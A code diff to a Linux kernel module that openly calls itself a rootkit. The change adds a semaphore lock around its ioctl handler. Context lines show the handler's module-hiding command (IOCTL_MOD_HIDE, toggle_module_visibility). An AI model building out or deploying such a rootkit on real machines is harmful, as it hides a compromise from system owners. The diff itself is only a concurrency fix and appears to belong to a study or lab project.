@@ -11,6 +11,7 @@
 #include <linux/reboot.h>
 #include <linux/sched.h>
 #include <linux/sched/signal.h>
+#include <linux/semaphore.h>
 #include <linux/slab.h>
 #include <linux/syscalls.h>
 #include <linux/uaccess.h>
@@ -31,6 +32,9 @@ MODULE_AUTHOR("FOOBAR");
 MODULE_DESCRIPTION("FOOBAR");
 MODULE_LICENSE("Dual MIT/GPL");
 MODULE_VERSION("0.1");
+
+// Big lock
+static DEFINE_SEMAPHORE(lock);
 
 // The rootkit module should be visible by default.
 static bool module_hidden = false;
@@ -225,6 +229,8 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 
     printk(KERN_INFO "%s\n", __func__);
 
+    // Avoid concurrent execution
+    down(&lock);
     switch (ioctl) {
     case IOCTL_MOD_HIDE:
         toggle_module_visibility();
@@ -278,6 +284,7 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
         ret = -EINVAL;
     }
 
+    up(&lock);
     return ret;
 }
 
